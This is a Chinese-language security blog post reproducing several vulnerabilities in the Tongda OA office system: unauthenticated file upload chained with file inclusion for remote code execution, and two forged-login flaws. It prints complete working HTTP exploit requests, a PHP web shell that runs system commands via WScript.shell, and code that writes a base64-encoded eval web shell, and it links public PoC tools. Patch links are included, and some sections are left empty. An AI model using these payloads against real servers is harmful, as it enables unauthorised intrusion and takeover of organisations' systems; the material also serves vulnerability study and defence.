---
title: "通达OA漏洞复现"
categories: ["安全技术", "工具分享"]
tags: ["webshell", "漏洞利用", "渗透测试", "漏洞复现"]
draft: false
slug: "562"
date: "2020-09-01 15:44:00"
---

# 通达 OA 介绍

> 通达 OA 是北京通达信科科技有限公司出品的 "Office Anywhere 通达网络智能办公系统"。

# 文件上传&文件包含 getshell

**漏洞信息：**

> 3 月 13 日，通达 OA 在官方论坛发布通告称，近日接到用户反馈遭到勒索病毒攻击，提示用户注意安全风险，并且于同一天对所有版本发布了加固补丁。

> 在受影响的版本中，攻击者可以在未认证的情况下向服务器上传 jpg 图片文件，然后包含该文件，造成远程代码执行。该漏洞无需登录即可触发

**漏洞等级：高危**

**漏洞影响版本：**

- V11 版
- 2017 版
- 2016 版
- 2015 版
- 2013 增强版
- 2013 版

**漏洞原理：**

该漏洞存在于以下两个链接中：

```
任意文件上传漏洞  /ispirit/im/upload.php
本地文件包含漏洞  /ispirit/interface/gateway.php
```

```
有些版本gateway.php路径不同
如2013:
/ispirit/im/upload.php
/ispirit/interface/gateway.php
2017：
/ispirit/im/upload.php
/mac/gateway.Php
本文使用的v11版本路径为
/ispirit/im/upload.php
/ispirit/interface/gateway.php
访问任意文件上传漏洞路径/ispirit/im/upload.php
```

通达 OA 使用`zend`加密，需要使用[`SeayDzend`工具][1]解密

这个工具同样出自[`Seay`师傅][2]之手（Seay 源代码审计系统就是出自这个师傅）

也可以使用在线加[解密网站][3]

比较安装补丁前后的文件`ispirit/im/upload.php`如下：

![][4]

可以看出`upload.php`在修复前如果`$P`非空就不需要通过`auth.php`验证即可执行后续代码，

利用此处逻辑伸缩可绕过过登陆验证直接上传文件

往下走遇到`$DEST_UID`同样也可以通过`POST`的方式自行赋值

![][5]

接着到了判断文件的点，此处可以知道文件上传的变量名为`ATTACHMENT`

![][6]

继续跟进`upload`函数跳转到文件`inc/utility_file.php`

这里对上传的文件进行了一系列的检查，包括黑名单等限制

![][7]

那么我们上传`jpg`格式的`php`代码，然后文件包含即可

**漏洞复现：**

首先自行下载 11.3[安装包][8]

下载完源码后全部默认安装一直下一步，安装完后访问`localhost`或者你本地的`ip`

![登陆界面][9]

在未登录状态访问任意文件上传漏洞路径`/ispirit/im/upload.php`

![][10]

访问路径显示`- ERR 用户未登录`，此时 burp 抓包拦截并修改为如下：

```
POST /ispirit/im/upload.php HTTP/1.1
Host: 10.103.51.104
Content-Length: 655
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="UPLOAD_MODE"

2
------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="P"


------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundaryBwVAwV3O4sifyhr3
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg

<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>

------WebKitFormBoundaryBwVAwV3O4sifyhr3--
```

这里使用了`COM`组件`wscript.shell`来绕过`disable_function`

![][11]

打开文件夹可以看到未经过登录验证成功上传了 jpg 文件：

![][12]

接下来访问文件包含利用的链接：`/ispirit/interface/gateway.php`，

`POST`给`json`赋值，指定`key`为`url`，`value`为文件位置

修改为如下：

```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 10.103.51.104
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

json={"url":"/general/../../attach/im/2009/1066533428.jpg"}&cmd=whoami
```

![][13]

成功执行命令！也可以把图片马的内容改为执行写入一句话的命令：

```
<?php
$fp = fopen('test.php', 'w');
$a = base64_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==");
fwrite($fp, $a);
fclose($fp);
```

![][14]

修改文件名发包执行文件包含后，`shell`被成功写入：

![][15]

**修复建议：**

官方通告：https://www.tongda2000.com/news/p673.php

| 版本        | 更新包下载地址                                              |
| ----------- | ----------------------------------------------------------- |
| V11 版      | http://cdndown.tongda2000.com/oa/security/2020_A1.11.3.exe  |
| 2017 版     | http://cdndown.tongda2000.com/oa/security/2020_A1.10.19.exe |
| 2016 版     | http://cdndown.tongda2000.com/oa/security/2020_A1.9.13.exe  |
| 2015 版     | http://cdndown.tongda2000.com/oa/security/2020_A1.8.15.exe  |
| 2013 增强版 | http://cdndown.tongda2000.com/oa/security/2020_A1.7.25.exe  |
| 2013 版     | http://cdndown.tongda2000.com/oa/security/2020_A1.6.20.exe  |

参考文章：

- [漏洞复现 | 通达 OA 命令执行漏洞复现][16]
- [通达 OA 文件上传&文件包含漏洞解析][17]
- [通达 OA 任意文件上传+文件包含 GetShell][18]
- [通达 oa 远程命令执行][19]

# 任意前台登录漏洞

**漏洞信息：**

> 通达 OA 是一套国内常用的办公系统，其此次安全更新修复的高危漏洞为任意用户登录漏洞。攻击者在远程且未经授权的情况下，通过利用此漏洞，可以直接以任意用户身份登录到系统（包括系统管理员）。

**漏洞等级：高危 **

**漏洞影响版本：**

- 通达 OA < 11.5.200417

**漏洞原理：**

解密工具参照第一部分漏洞原理

**漏洞复现**

首先，不登录界面打开查看`cookie`：

![][20]

使用`POC`工具[`TongDaOA-Fake-User`][21]获取链接`cookie`：

![][22]

将原来的`cookie`修改为`POC`获取到的`cookie`：

![][23]

访问`/general/index.php`即可直接访问系统：

![][24]

**修复建议：**

- 打补丁：https://www.tongda2000.com/download/sp2019.php
- 使用 WAF 拦截

参考文章：

- [通达 OA 前台任意用户登录漏洞复现][25]
- [通达 OA 前台任意伪造用户登录审计和复现][26]

# 任意用户登录漏洞（匿名 RCE）

**漏洞信息：**

> 伪造任意用户（含管理员）登录漏洞的触发点在扫码登录功能，服务端只取了 UID 来做用户身份鉴别，由于 UID 是整型递增 ID，从而导致可以登录指定 UID 用户（admin 的缺省 UID 为 1

**漏洞等级：高危**

**漏洞影响版本：**

- 通达 OA v2017、v11.x < v11.5 支持扫码登录版本

**漏洞原理：**

`v11.5`更新修复了客户端扫码登录和`Web`端扫码登录接口

Web 端扫码登录流程大致流程分四步：

- Web 端访问 /general/login_code.php?codeuid=随机字符串 生成一个二维码，codeuid 作为这个二维码凭证。

- Web 端通过循环请求/general/login_code_check.php，将 codeuid 发送到服务端，判断是否有人扫了这个二维码。

- 移动端扫码这个二维码，然后将 codeuid 等数据发送到/general/login_code_scan.php 服务端进行保存。

- Web 端通过 login_code_check.php 取得 codeuid 等扫码数据后（其实取数据这一步已经产生\$\_SESSION["LOGIN_UID"]登录了），再通过 Web 端发送到 logincheck_code.php 进行登录。

Web 端登录请求脚本如下：

**漏洞复现：**

`POC&EXP`工具：https://github.com/zrools/tools/tree/master/python

![][27]

![][28]

**修复建议：**

参考文章：

- [代码审计 | 通达 OA 任意用户登录漏洞（匿名 RCE）分析][29]

# 任意文件删除 getshell

本文完。

[1]: https://pan.baidu.com/s/1boJrEbX#2uj7
[2]: http://www.cnseay.com
[3]: http://dezend.qiling.org/free.html
[4]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_161524.png
[5]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_162051.png
[6]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_162124.png
[7]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_162641.png
[8]: https://pan.baidu.com/s/1c0tiX5VIdrFdOkeTsRPpYQ#640o
[9]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200901_143818.png
[10]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200901_143920.png
[11]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200901_161129.png
[12]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200901_161213.png
[13]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200901_161252.png
[14]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200901_151848.png
[15]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200901_153950.png
[16]: https://mp.weixin.qq.com/s/a3Q-0_UAoMtYU2FMo_oG-A
[17]: https://bbskali.cn/forum.php?mod=viewthread&tid=2026
[18]: https://mp.weixin.qq.com/s/dmXYxqFWGFl3ZnXOwZ-nlQ
[19]: https://www.freebuf.com/articles/web/241139.html
[20]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_142024.png
[21]: https://github.com/NS-Sp4ce/TongDaOA-Fake-User
[22]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_141701.png
[23]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_142024.png
[24]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_145113.png
[25]: https://bbs.zkaq.cn/t/4434.html
[26]: https://www.freebuf.com/articles/web/234992.html
[27]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_171933.png
[28]: https://img.soapffz.com/archives_img/2020/09/01/archives_20200902_172448.png
[29]: https://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/
